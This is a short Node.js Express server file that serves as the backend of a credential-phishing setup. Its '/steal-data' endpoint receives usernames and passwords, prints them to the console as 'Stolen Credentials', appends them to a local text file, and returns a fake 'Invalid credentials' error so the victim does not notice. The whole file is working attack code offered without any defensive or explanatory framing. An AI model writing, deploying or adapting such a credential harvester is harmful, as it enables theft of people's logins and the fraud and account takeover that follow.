const express = require("express");
const fs = require("fs");
const cors = require("cors");
const bodyParser = require("body-parser");
const path = require("path"); // Import the 'path' module


const app = express();
app.use(cors());
app.use(bodyParser.json());

app.use(express.static(path.join(__dirname, "..")));  // Serve files from the root


// 🛑 API to Capture Stolen Credentials
app.post("/steal-data", (req, res) => {
    const { username, password } = req.body;

    // Log to Console
    console.log(`🚨 Stolen Credentials: Username - ${username}, Password - ${password}`);

    // Save credentials to a file (Optional)
    const logData = `Username: ${username}, Password: ${password}\n`;
    fs.appendFile("stolen_credentials.txt", logData, (err) => {
        if (err) console.error("Error saving credentials:", err);
    });

    // Send Fake Error Message to Victim
    res.json({ message: "Error: Invalid credentials!" }); // Fake error message
});

// Start the Server
const PORT = 5001;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
